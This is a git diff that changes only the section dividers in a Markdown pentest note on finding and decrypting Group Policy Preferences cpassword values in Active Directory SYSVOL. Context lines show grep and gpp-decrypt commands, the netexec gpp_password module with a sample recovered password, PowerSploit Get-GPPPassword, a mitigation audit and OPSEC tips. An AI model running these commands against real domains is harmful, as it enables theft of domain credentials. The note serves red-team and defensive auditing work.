@@ -23,7 +23,7 @@ linked:
 ---
 # AD - GPO y SYSVOL Enumeration - GPP cpassword
 
-***
+---
 
 ## Find cpassword in SYSVOL
 
@@ -45,7 +45,7 @@ grep -rl "cpassword" /mnt/sysvol --include="*.xml"
 grep -hPo 'cpassword="[^"]+"' /mnt/sysvol/corp.local/Policies/*/Machine/Preferences/*/*.xml
 ```
 
-___
+---
 
 ## Decrypt cpassword (gpp-decrypt)
 
@@ -72,7 +72,7 @@ grep -hPo 'cpassword="\K[^"]+' /mnt/sysvol/corp.local/Policies/*/Machine/Prefere
   while read pwd; do gpp-decrypt "$pwd"; done
 ```
 
-___
+---
 
 ## GPP File Patterns
 
@@ -86,7 +86,7 @@ ___
 | `Printers.xml` | `<Properties username="..." cpassword="..."/>` | Printer install |
 ^ad-cpassword-patterns
 
-___
+---
 
 ## netexec gpp Modules
 
@@ -107,7 +107,7 @@ nxc smb <DC> -u user -p pass -M gpp_password
 # [+] Password: Local*P4ssword!2
 ```
 
-___
+---
 
 ## PowerSploit Get-GPPPassword
 
@@ -126,7 +126,7 @@ Get-GPPPassword
 # Output: UserName, NewName, Cpassword, Password (decrypted), Changed, Domain, Type
 ```
 
-___
+---
 
 ## Modern Mitigations
 
@@ -146,7 +146,7 @@ findstr /S /I "cpassword" \\<DC>\sysvol\*.xml > cpassword_audit.txt
 :: Cualquier match = legacy GPP a remover
 ```
 
-___
+---
 
 ## OPSEC
 
@@ -159,4 +159,4 @@ ___
 | Cleanup post-engagement | No leftovers | Hygiene. |
 ^ad-cpassword-opsec
 
-***
+---
